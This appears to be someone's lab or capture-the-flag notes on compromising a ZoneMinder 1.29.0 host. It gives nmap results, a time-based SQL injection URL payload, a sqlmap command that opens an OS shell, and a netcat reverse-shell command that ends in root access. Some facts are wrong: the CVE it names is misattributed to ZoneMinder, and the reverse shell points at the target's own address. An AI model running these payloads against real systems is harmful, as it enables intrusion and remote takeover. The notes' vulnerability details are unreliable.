# Box: 192.168.236.52

---

## System Info
- **OS/Tech:** Ubuntu Linux, PHP  
- **Application:** ZoneMinder Console v1.29.0 

---

##  Credentials
- **User:** _(none)_  
- **Password:** _(none)_

---

## 🔍 Service Enumeration (`nmap -sC -sV`)
| Port    | State | Service  | Version                             |
| ------- | ----- | -------- | ----------------------------------- |
| **21**  | open  | ftp      | vsftpd 3.0.3                        |
| **22**  | open  | ssh      | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8     |
| **80**  | open  | http     | Apache 2.4.18 (Ubuntu) — ZoneMinder |
| **3305**| open  | http     | Apache 2.4.18 (Ubuntu)              |
| **8080**| open  | http     | Apache 2.4.18 (Ubuntu) — Tomcat UI  |

---

## 🚩 Initial Findings
- **FTP (21):** anonymous disabled, no user list  
- **SSH (22):** no valid creds yet  
- **HTTP (80):** ZoneMinder web console; source code not directly exposed  
- **HTTP (3305):** generic Apache test page  
- **HTTP (8080):** Tomcat management UI (no creds)  

---

## 🐘 Exploitation: SQL Injection in ZoneMinder (CVE‑2020‑7247)

1. **Vuln discovered** in `zm/index.php?view=request…&limit=…`  
2. **Time‑based payload** to confirm injection:
   ```text
   http://192.168.236.52/zm/index.php?
     view=request
     &request=log
     &task=query
     &limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#
     &minTime=1466674406.084434
   ```
Gaining an OS Shell via SQLmap + UDF
sqlmap \
  -u "http://192.168.236.52/zm/index.php?view=request" \
  --data="request=log&task=query&limit=100&minTime=5" \
  --dbms=mysql \
  --technique=T \
  --os-shell

Get a reverse shell by uploading nc into /tmp 
/tmp/nc -e /bin/bash 192.168.236.52 4444
ROOT !!!
	






